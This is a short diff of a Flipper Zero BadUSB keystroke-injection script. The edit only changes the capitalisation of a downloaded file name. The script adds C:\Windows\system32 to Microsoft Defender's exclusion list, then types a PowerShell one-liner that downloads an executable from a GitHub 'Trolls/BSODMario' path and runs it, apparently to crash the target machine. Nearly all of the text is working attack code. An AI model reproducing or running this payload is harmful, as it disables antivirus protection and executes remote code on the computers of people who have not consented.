@@ -19,5 +19,5 @@ DELAYS 1500
 STRING Add-MpPreference -ExclusionPath C:\Windows\system32
 ENTER
 DELAY 500
-STRING $down=New-Object System.Net.WebClient;$url='https://github.com/DevBubba/FlipperZero/raw/main/BadUSB/Trolls/BSODMario/Mario_Dist.exe';$file='mario_dist.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
+STRING $down=New-Object System.Net.WebClient;$url='https://github.com/DevBubba/FlipperZero/raw/main/BadUSB/Trolls/BSODMario/Mario_Dist.exe';$file='Mario_Dist.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
 ENTER
